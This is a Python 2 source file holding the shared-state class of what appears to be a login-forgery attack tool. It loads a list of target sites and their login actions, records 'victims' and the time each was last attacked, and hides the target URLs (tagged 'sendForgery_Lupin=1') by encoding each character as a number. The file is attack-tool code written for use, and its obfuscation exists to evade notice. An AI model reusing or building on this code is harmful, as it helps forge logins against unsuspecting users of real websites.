import time

class persistentData:    

    _instance          = None

    def __init__(self):
        self.dnsCache = {}
        self.loginAction = self.mapLoginActions()
	self.obfuscatedHosts = self.obfuscateHosts()        
	self.lastAttackTime = {}
        self.victims = []
	self.shutDown = False
        

    def addDnsCache(self, host, address):
        self.dnsCache[host] = address


    def getDnsCache(self, host):
        if host in self.dnsCache:
            return self.dnsCache[host]
        return None


    def mapLoginActions(self):
	try:
		targetSites = open("targetSites.txt")
	except:
		self.shutDown = True
		return -1

	actions = {}
	for filelineno, line in enumerate(targetSites):
	    cr = line.find("\r")
            if cr != -1:
                line = line[:cr]
	    nl = line.find("\n")
	    if nl != -1:
                line = line[:nl]
                
            host_action = line.split("|")
	    if host_action[0].startswith("http://"):
               host_action[0] = host_action[0][7:]
	    actions[host_action[0]] = "\""+host_action[1]+"\""
        
	targetSites.close()
	return actions


    def shutOff(self):
	return self.shutDown


    def getLoginAction(self, host):	
       	return self.loginAction[host]


    def setLastAttackTime(self, client):
	self.lastAttackTime[client] = time.time()


    def getLastAttackTime(self, client):
	if client in self.lastAttackTime:
        	return self.lastAttackTime[client]
	return 0
   
  
    def addVictim(self, client):
        self.victims.append(client)


    def oldVictim(self, client):
        if client in self.victims:
		return True
	return False


    def getObfuscatedHosts(self):
	return self.obfuscatedHosts

    def obfuscateHosts(self):
	obfs = ""
	targetSites = open("targetSites.txt")

	for filelineno,line in enumerate(targetSites):
            cr = line.find("\r")
            if cr != -1:
                line = line[:cr]
	    nl = line.find("\n")
	    if nl != -1:
                line = line[:nl]
            host = line.split("|")[0]
            if host.startswith("http://"):
               host = host[7:]
               
            obfs+="\""+self.obfuscate("http://"+host+"?sendForgery_Lupin=1")+"\","
            
        obfs = obfs[:-1]
        targetSites.close() 
	
	return obfs



    def obfuscate(self,host):
        obfs = ""
        for letter in host:
            obfs+=str(ord(letter)+255)+"."
        return obfs[:-1]



    def getInstance():
        if persistentData._instance == None:
            persistentData._instance = persistentData()

        return persistentData._instance

    getInstance = staticmethod(getInstance)



